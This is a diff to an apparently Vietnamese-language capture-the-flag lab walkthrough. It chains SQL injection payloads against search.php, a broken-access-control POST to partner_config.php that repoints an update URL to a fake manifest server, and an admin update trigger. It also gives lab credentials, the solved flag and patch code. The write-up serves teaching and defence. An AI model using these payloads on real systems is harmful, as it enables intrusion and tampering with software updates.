@@ -215,116 +215,149 @@ if ($qty <= 0) {
 ---
 
 ## ═══════════════════════════════════════════════
-## VULNERABILITY 3 – Supply Chain Poisoning (Partner Update)
+## VULNERABILITY 3 – Supply Chain Poisoning + Broken Access Control
 ## ═══════════════════════════════════════════════
 
 **Mức độ lỗ hổng:** Hard (Chained Attack)  
 **Mức độ tìm flag:** Very Hard  
-**URL bị lỗi:** `admin.php?check_updates=1`  
-**Tài khoản cần:** `admin / Admin@DBS401!2024`
+**Endpoint recon:** `search.php?q=...`  
+**Endpoint đổi cấu hình:** `partner_config.php`  
+**Endpoint trigger:** `admin.php?check_updates=1`  
+**Tài khoản cần:** `student1 / Student@123` để đổi URL; `admin / Admin@DBS401!2024` để trigger update.
 
 ---
 
 ### Bước 1 – Reconnaissance via SQLi (Vuln 1)
 
-Dùng SQLi tại `search.php` để đọc `CONFIG_STORE` (is_public=0):
+Dùng SQLi tại `search.php` để đọc `CONFIG_STORE`:
 
 ```sql
-' UNION SELECT 1,config_key,config_value FROM CONFIG_STORE WHERE is_public=0 AND ROWNUM<=5 AND '1'='1
+%' AND 1=2) UNION SELECT 1,c.config_key,c.config_value
+FROM CONFIG_STORE c, STUDENTS s
+WHERE c.config_key='update_url'
+  AND s.hidden_marker='NORMAL'
+  AND ROWNUM=1--
 ```
 
 → Phát hiện:
 - `update_url` = `http://127.0.0.1:8081/manifest.json`
-- `app_version` = `3.1.0`
+- app đang dùng manifest JSON.
 
-**Suy luận:** Admin panel sẽ fetch URL này khi kiểm tra cập nhật. Nếu version trong manifest > 3.1.0 → trigger "update successful" và lộ `flag_part`.
+Đọc thêm version:
+
+```sql
+%' AND 1=2) UNION SELECT 1,c.config_key,c.config_value
+FROM CONFIG_STORE c, STUDENTS s
+WHERE c.config_key='app_version'
+  AND s.hidden_marker='NORMAL'
+  AND ROWNUM=1--
+```
+
+→ `app_version = 3.1.0`
+
+**Suy luận:** nếu manifest trả `version` lớn hơn `3.1.0`, `admin.php?check_updates=1` sẽ đi vào nhánh update successful.
 
 ---
 
-### Bước 2 – Chuẩn bị Partner Server Giả Mạo
+### Bước 2 – Tìm endpoint cấu hình Partner bị lỗi quyền
 
-Hacker cần chạy một HTTP server trả về manifest độc hại. Hai cách:
+Endpoint `partner_config.php` không nằm trên navbar, nhưng tồn tại trong webroot. Sau khi login bằng `student1`, truy cập:
 
-**Cách A – Python (cùng máy, override port 8081):**
+```text
+/dbs401-oracle-app/partner_config.php
+```
+
+Trang này ghi “ADMIN ONLY” nhưng code chỉ kiểm tra đăng nhập, **không kiểm tra `$_SESSION['role'] === 'admin'`**. Vì vậy user thường có thể đổi `CONFIG_STORE.update_url`.
+
+---
+
+### Bước 3 – Chuẩn bị Partner Server Giả Mạo
+
+Manifest độc hại chỉ chứa **nửa đầu hex** của Flag 3. Nửa sau nằm server-side trong `admin.php` dưới dạng `FLAG3_LOCAL_HEX_SUFFIX`.
 
 ```bash
-# Tạo file manifest.json
+mkdir -p /tmp/partner-fake
 cat > /tmp/partner-fake/manifest.json << 'EOF'
 {
   "version": "9.9.9",
   "status": "critical_update",
   "checksum": "deadbeef1337",
-  "flag_part": "4442533430317b3575707031795f436834316e5f50303135306e316e675f303931327d"
+  "flag_part": "4442533430317b3575707031795f436834"
 }
 EOF
-
-# Dừng Nginx partner server đang chạy trên 8081 (nếu cần)
-# Hoặc đổi update_url sang port khác
-
-# Chạy Python HTTP server
 cd /tmp/partner-fake
-python3 -m http.server 8082
+python3 -m http.server 8081 --bind 0.0.0.0
 ```
 
-**Cách B – Dùng script exploit tự động:**
+Nếu target và attacker khác máy, dùng URL mà target truy cập được, ví dụ:
+
+```text
+http://192.168.102.3:8081/manifest.json
+```
+
+---
+
+### Bước 4 – Đổi `update_url` qua `partner_config.php`
+
+Đăng nhập `student1`, gửi POST:
 
 ```bash
-python3 tools/exploit_flag3_local.py --host 127.0.0.1 --port 80
+curl -s -b student_cookies.txt -c student_cookies.txt   -X POST "$TARGET/partner_config.php"   -H "Content-Type: application/x-www-form-urlencoded"   --data-urlencode "manifest_url=http://192.168.102.3:8081/manifest.json"
 ```
 
-Script sẽ tự khởi động fake server trên port 8081 và trigger update.
+→ `Partner manifest URL updated successfully.`
+
+Đây là điểm khác với flow cũ: **không cần SQLPlus**, không dùng stacked SQLi; lỗi chính ở bước đổi URL là Broken Access Control.
 
 ---
 
-### Bước 3 – Đổi update_url (Database Manipulation)
+### Bước 5 – Trigger update bằng admin
 
-> **Lưu ý kỹ thuật quan trọng:**  
-> OCI8 không hỗ trợ stacked queries (`;` để chạy nhiều lệnh một lúc).  
-> Việc đổi `update_url` trong lab này cần thực hiện **trực tiếp qua SQLPlus** hoặc  
-> **bằng quyền admin DB** – không thể thực hiện qua UNION SELECT trên search.php.  
->
-> Trong kịch bản demo, nhóm thực hiện bước này bằng SQLPlus:
+Đăng nhập admin và gọi:
 
-```sql
--- Chạy trong SQLPlus với dbs401_user
-UPDATE CONFIG_STORE
-SET config_value = 'http://127.0.0.1:8082/manifest.json'
-WHERE config_key = 'update_url';
-COMMIT;
+```bash
+curl -s -b admin_cookies.txt "$TARGET/admin.php?check_updates=1"
 ```
 
-Trong thực tế (môi trường sản xuất), attacker có thể thực hiện bước này nếu:
-- Có quyền truy cập trực tiếp database (leaked credentials)
-- Có second-order injection
-- Có lỗ hổng RCE khác trên server
+Flow server-side:
+
+```text
+admin.php đọc CONFIG_STORE.update_url
+→ file_get_contents(manifest_url)
+→ JSON version 9.9.9 > APP_VERSION 3.1.0
+→ lấy manifest['flag_part']
+→ ghép với FLAG3_LOCAL_HEX_SUFFIX trong admin.php
+→ hex2bin()
+→ hiển thị plaintext flag
+```
 
 ---
 
-### Bước 4 – Trigger Attack
+### Bước 6 – Kết quả Flag 3
 
-1. Đăng nhập `admin / Admin@DBS401!2024`.
-2. Truy cập `admin.php`.
-3. Nhấn **"Check for Partner Updates"**.
+Manifest cung cấp nửa đầu:
 
-→ Hệ thống fetch manifest từ server hacker → version `9.9.9 > 3.1.0` → hiển thị thông báo "Update Successful!" và lộ `flag_part`.
-
----
-
-### Bước 5 – Decode Flag 3
-
-`flag_part` hiển thị trên trang:
+```text
+4442533430317b3575707031795f436834
 ```
+
+`admin.php` ghép với suffix server-side:
+
+```text
+316e5f50303135306e316e675f303931327d
+```
+
+Full hex sau khi ghép:
+
+```text
 4442533430317b3575707031795f436834316e5f50303135306e316e675f303931327d
 ```
 
-Decode hex:
-```bash
-echo "4442533430317b3575707031795f436834316e5f50303135306e316e675f303931327d" | xxd -r -p
-# hoặc:
-python3 tools/decode_helper.py --hex 4442533430317b3575707031795f436834316e5f50303135306e316e675f303931327d
-```
+Decode ra:
 
-→ **`DBS401{5upp1y_Ch41n_P0150n1ng_0912}`**
+```text
+DBS401{5upp1y_Ch41n_P0150n1ng_0912}
+```
 
 ✅ **FLAG 3: `DBS401{5upp1y_Ch41n_P0150n1ng_0912}`**
 
@@ -332,20 +365,24 @@ python3 tools/decode_helper.py --hex 4442533430317b3575707031795f436834316e5f503
 
 ### Cách vá lỗi
 
-```php
-// Vulnerable – tin tưởng hoàn toàn vào URL từ database
-$url = $conf['CONFIG_VALUE'] ?? DEFAULT_UPDATE_URL;
-$jsonData = @file_get_contents($url);
+1. `partner_config.php`: bắt buộc admin role trước khi update `CONFIG_STORE.update_url`.
+2. `partner_config.php`: chỉ cho phép URL trong allowlist.
+3. `admin.php`: validate URL trước khi fetch, chặn IP nội bộ/metadata, timeout ngắn.
+4. `admin.php`: manifest phải có chữ ký số/HMAC hợp lệ; không tin `flag_part` hay payload từ đối tác nếu chưa verify.
 
-// Secure – whitelist URL + xác thực chữ ký số
+```php
+if ($_SESSION['role'] !== 'admin') {
+    http_response_code(403);
+    exit;
+}
+
 $allowedUpdateUrls = [
-    'http://cdn.fpt-partner.net/v3/manifest.json',
-    'https://api.fpt-partner-cloud.net/v3/updates'
+    'http://127.0.0.1:8081/manifest.json',
+    'https://cdn.fpt-partner.net/v3/manifest.json'
 ];
-if (!in_array($url, $allowedUpdateUrls)) {
-    $msg = "Update URL is not from an authorized source.";
-} else {
-    // Fetch + verify digital signature trước khi tin tưởng content
+
+if (!in_array($manifestUrl, $allowedUpdateUrls, true)) {
+    $msg = 'Blocked: manifest URL is not approved.';
 }
 ```
 
@@ -364,12 +401,12 @@ if (!in_array($url, $allowedUpdateUrls)) {
 | 7 | `store.php` với số dư Credits thấp |
 | 8 | `store.php` với `quantity = -20000` và thông báo Credits tăng |
 | 9 | `store.php` với số dư Credits cao và Flag 2 hiển thị |
-| 10 | SQLi tìm `update_url` trong CONFIG_STORE |
-| 11 | SQLPlus: UPDATE CONFIG_STORE SET update_url = 'http://...' |
-| 12 | Fake partner server đang chạy (python3 -m http.server hoặc exploit_flag3_local.py) |
-| 13 | `admin.php` nhấn "Check for Partner Updates" → Flag 3 hex hiển thị |
-| 14 | Decode hex → Flag 3 plain text |
-| 15 | Secure versions so sánh trước/sau vá (search, store, admin) |
+| 10 | SQLi tìm `update_url` và `app_version` trong CONFIG_STORE |
+| 11 | Fuzz/truy cập `partner_config.php` bằng user thường |
+| 12 | POST `manifest_url` mới qua `partner_config.php` thành công |
+| 13 | Fake partner server đang chạy và nhận request từ target |
+| 14 | `admin.php?check_updates=1` → Flag 3 plaintext hiển thị |
+| 15 | Secure versions so sánh trước/sau vá (search, store, partner_config, admin) |
 
 ---
 
